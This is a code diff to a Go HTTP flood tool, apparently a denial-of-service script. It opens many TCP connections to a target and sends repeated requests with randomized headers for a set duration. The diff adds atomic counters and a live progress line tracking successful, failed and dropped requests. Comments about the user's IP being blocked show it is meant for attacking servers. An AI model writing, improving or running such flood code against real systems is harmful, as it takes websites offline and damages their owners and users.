@@ -22,17 +22,22 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"sync/atomic"
 	"time"
 )
 
 var (
-	host      = ""
-	port      = "80"
-	page      = ""
-	mode      = ""
-	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
-	start     = make(chan bool)
-	acceptall = []string{
+	host            = ""
+	port            = "80"
+	page            = ""
+	mode            = ""
+	abcd            = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
+	start           = make(chan bool)
+	total     int64 = 0
+	success   int64 = 0
+	fails     int64 = 0
+	drops     int64 = 0
+	acceptall       = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept-Encoding: gzip, deflate\r\n",
 		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -198,7 +203,9 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			//fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			atomic.AddInt64(&drops, 1)
+			atomic.AddInt64(&total, 1)
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -216,16 +223,20 @@ func flood() {
 						s := string(tmp[:])
 						//fmt.Printf("Response: %s\n", s)
 						if matched, _ := regexp.MatchString("HTTP/\\d\\.\\d\\s2\\d+", s); matched == true {
-							fmt.Println("OK")
+							//fmt.Println("OK")
+							atomic.AddInt64(&success, 1)
 						} else {
-							fmt.Println("BAD")
+							//fmt.Println("BAD")
+							atomic.AddInt64(&fails, 1)
 						}
 					} else {
-						fmt.Println(err)
+						//fmt.Println(err)
+						atomic.AddInt64(&fails, 1)
 					}
 				}
 			}
 			s.Close()
+			atomic.AddInt64(&total, 1)
 		}
 		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
@@ -298,8 +309,15 @@ func main() {
 		fmt.Println(err)
 		return
 	}
-	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
+	fmt.Println("Flood will end in " + os.Args[4] + " seconds.\n\n")
 	close(start)
-	time.Sleep(time.Duration(limit) * time.Second)
+	//time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
+	n := 10 * limit
+	for n > 0 {
+		fmt.Printf("\r %d total, %d sucess, %d fails, %d drops", total, success, fails, drops)
+		time.Sleep(time.Millisecond * 100)
+		n--
+	}
+	println("\n\nFinish")
 }
